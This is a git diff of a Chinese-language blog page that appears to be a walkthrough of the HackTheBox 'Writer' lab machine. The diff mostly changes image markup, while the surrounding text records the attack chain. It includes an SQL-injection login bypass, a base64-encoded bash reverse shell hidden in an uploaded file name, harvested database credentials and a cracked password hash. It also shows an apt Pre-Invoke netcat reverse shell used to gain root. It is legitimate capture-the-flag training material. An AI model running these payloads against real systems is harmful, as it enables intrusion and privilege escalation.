@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;361  10.10.11.101   端口扫描22,80,139,445: 123456789101112131415161718192021222324252627282930$ nmap -sC -sV 10.10.11.101Starting Nmap 7.91 ( https:&#x2F;&#x2F;n">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;361  10.10.11.101                                                                                                              端口扫描22,80,139,445: 1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Writer - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/08/06/Writer-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;361  10.10.11.101   端口扫描22,80,139,445: 123456789101112131415161718192021222324252627282930$ nmap -sC -sV 10.10.11.101Starting Nmap 7.91 ( https:&#x2F;&#x2F;n">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;361  10.10.11.101                                                                                                              端口扫描22,80,139,445: 1">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080601.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080602.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080603.jpg">
@@ -136,7 +136,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -226,30 +226,79 @@
 </li>
 <li><h2 id="10-10-11-101"><a href="#10-10-11-101" class="headerlink" title="10.10.11.101"></a>10.10.11.101</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080601.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080601.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,80,139,445:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.101</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 09:32 CST</span><br><span class="line">Nmap scan report for 10.10.11.101</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)</span><br><span class="line">|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)</span><br><span class="line">|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Story Bank | Writer.HTB</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2021-08-06T01:32:41</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 36.36 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>一个blog：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080602.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080602.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>目录扫描用大点的字典发现管理目录：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.11.101/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50</span><br><span class="line"></span><br><span class="line">/contact              (Status: 200) [Size: 4905]</span><br><span class="line">/about                (Status: 200) [Size: 3522]</span><br><span class="line">/static               (Status: 301) [Size: 313] [--&gt; http://10.10.11.101/static/]</span><br><span class="line">/logout               (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]</span><br><span class="line">/dashboard            (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]</span><br><span class="line">/administrative       (Status: 200) [Size: 1443]</span><br><span class="line">/server-status        (Status: 403) [Size: 277]</span><br></pre></td></tr></table></figure>
 
-<h2 id="administrative"><a href="#administrative" class="headerlink" title="administrative"></a>administrative</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080603.jpg" alt=""></p>
+<h2 id="administrative"><a href="#administrative" class="headerlink" title="administrative"></a>administrative</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080603.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>登录sql注入,万能密码登录：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080604.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080604.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>常规手注，union可以发现第二列回显：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080605.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080605.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>可以利用load_file读文件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080606.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080606.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="apache配置文件"><a href="#apache配置文件" class="headerlink" title="apache配置文件"></a>apache配置文件</h2><p>默认路径，读取apache配置文件，发现WSGI,后面就是一步步读文件：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080607.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080607.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="writer-wsgi"><a href="#writer-wsgi" class="headerlink" title="writer.wsgi"></a>writer.wsgi</h2><p><code>/var/www/writer.htb/writer.wsgi</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define logging</span></span><br><span class="line">logging.basicConfig(stream=sys.stderr)</span><br><span class="line">sys.path.insert(<span class="number">0</span>,<span class="string">"/var/www/writer.htb/"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Import the __init__.py from the app folder</span></span><br><span class="line"><span class="keyword">from</span> writer <span class="keyword">import</span> app <span class="keyword">as</span> application</span><br><span class="line">application.secret_key = os.environ.get(<span class="string">"SECRET_KEY"</span>, <span class="string">""</span>)</span><br></pre></td></tr></table></figure>
 
@@ -261,17 +310,52 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -n "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1'" | base64</span><br><span class="line">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMSc</span><br><span class="line"></span><br><span class="line">touch '1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMSc= | base64 -d | bash `;'</span><br></pre></td></tr></table></figure>
 
 <p>根据代码是需要在image_url处触发，上传可以发现在static目录里，所以可以使用file协议，image_url里使用恶意文件名，触发，得到www shell:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080608.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080609.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080610.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080608.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080609.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080610.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>前面得到的数据库账号密码只能连接writer，根据信息还有个dev：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u admin -pToughPasswordToCrack -D writer</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080611.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080611.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>读配置文件，可以发现dev的djangouser账号密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[client]</span><br><span class="line">database &#x3D; dev</span><br><span class="line">user &#x3D; djangouser</span><br><span class="line">password &#x3D; DjangoSuperPassword</span><br><span class="line">default-character-set &#x3D; utf8</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080612.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080612.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="dev"><a href="#dev" class="headerlink" title="dev"></a>dev</h2><p>dev数据库里获取信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u djangouser -pDjangoSuperPassword </span><br><span class="line"></span><br><span class="line">MariaDB [dev]&gt; SELECT * FROM auth_user;</span><br><span class="line">SELECT * FROM auth_user;</span><br><span class="line">+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+</span><br><span class="line">| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |</span><br><span class="line">+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+</span><br><span class="line">|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A&#x3D; | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |</span><br><span class="line">+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>
 
@@ -279,14 +363,49 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -a 0 -m 10000 hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br><span class="line"></span><br><span class="line">pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A&#x3D;:marcoantonio</span><br><span class="line"></span><br><span class="line">marcoantonio</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的密码ssh登录，user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080613.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080613.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="disclaimer-to-John"><a href="#disclaimer-to-John" class="headerlink" title="disclaimer to John"></a>disclaimer to John</h1><p>运行pspy64，可以发现disclaimer以及定时的apt update：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080614.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080614.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 这个文件filter组可写，当前kyle用户在filter组里：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080615.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080615.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 这个脚本应该是发送邮件时会被调用，所以可以尝试在里面添加恶意代码,然后发送邮件触发，打到john shell,后续可以直接使用私钥登录john：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080616.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080617.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080616.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080617.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="etc-postfix-disclaimer"><a href="#etc-postfix-disclaimer" class="headerlink" title="/etc/postfix/disclaimer"></a>/etc/postfix/disclaimer</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Localize these.</span></span><br><span class="line">INSPECT_DIR=/var/spool/filter</span><br><span class="line">SENDMAIL=/usr/sbin/sendmail</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get disclaimer addresses</span></span><br><span class="line">DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exit codes from &lt;sysexits.h&gt;</span></span><br><span class="line">EX_TEMPFAIL=75</span><br><span class="line">EX_UNAVAILABLE=69</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clean up when done or when aborting.</span></span><br><span class="line"><span class="built_in">trap</span> <span class="string">"rm -f in.$$"</span> 0 1 2 3 15</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start processing.</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$INSPECT_DIR</span> || &#123; <span class="built_in">echo</span> <span class="variable">$INSPECT_DIR</span> does not exist; <span class="built_in">exit</span></span><br><span class="line"><span class="variable">$EX_TEMPFAIL</span>; &#125;</span><br><span class="line"></span><br><span class="line">cat &gt;<span class="keyword">in</span>.$$ || &#123; <span class="built_in">echo</span> Cannot save mail to file; <span class="built_in">exit</span> <span class="variable">$EX_TEMPFAIL</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># obtain From address</span></span><br><span class="line">from_address=`grep -m 1 <span class="string">"From:"</span> <span class="keyword">in</span>.$$ | cut -d <span class="string">"&lt;"</span> -f 2 | cut -d <span class="string">"&gt;"</span> -f 1`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ `grep -wi ^<span class="variable">$&#123;from_address&#125;</span>$ <span class="variable">$&#123;DISCLAIMER_ADDRESSES&#125;</span>` ]; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/altermime --input=<span class="keyword">in</span>.$$ \</span><br><span class="line">                   --disclaimer=/etc/postfix/disclaimer.txt \</span><br><span class="line">                   --disclaimer-html=/etc/postfix/disclaimer.txt \</span><br><span class="line">                   --xheader=<span class="string">"X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm"</span> || \</span><br><span class="line">                    &#123; <span class="built_in">echo</span> Message content rejected; <span class="built_in">exit</span> <span class="variable">$EX_UNAVAILABLE</span>; &#125;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$SENDMAIL</span> <span class="string">"<span class="variable">$@</span>"</span> &lt;<span class="keyword">in</span>.$$</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> $?</span><br></pre></td></tr></table></figure>
 
 <h2 id="sendmail-py"><a href="#sendmail-py" class="headerlink" title="sendmail.py"></a>sendmail.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3 </span></span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">25</span></span><br><span class="line">From = <span class="string">'kyle@writer.htb'</span> </span><br><span class="line">To = <span class="string">'john@writer.htb'</span></span><br><span class="line"></span><br><span class="line">Message = <span class="string">'''\</span></span><br><span class="line"><span class="string">Subject: HI THERE! JOHN</span></span><br><span class="line"><span class="string">OOPS I GOT YOU MATE. </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	io = smtplib.SMTP(host,port)</span><br><span class="line">	io.ehlo()</span><br><span class="line">	io.sendmail(From,To,Message) </span><br><span class="line"><span class="keyword">except</span> Exceptions <span class="keyword">as</span> e:</span><br><span class="line">	<span class="keyword">print</span> (e) </span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">	io.quit()</span><br></pre></td></tr></table></figure>
@@ -301,7 +420,14 @@
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>添加一个Pre-Invoke，等待触发，root：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 'apt::Update::Pre-Invoke &#123;"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.4 4444 &gt;/tmp/f"&#125;;' &gt; /etc/apt/apt.conf.d/miao</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080618.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021080618.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Linux for Pentester: APT Privilege Escalation<br><a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a></li>
 <li>HTB Writer [Discussion] | RaidForums<br><a href="https://raidforums.com/Thread-Tutorial-HTB-Writer-Discussion" target="_blank" rel="noopener">https://raidforums.com/Thread-Tutorial-HTB-Writer-Discussion</a></li>
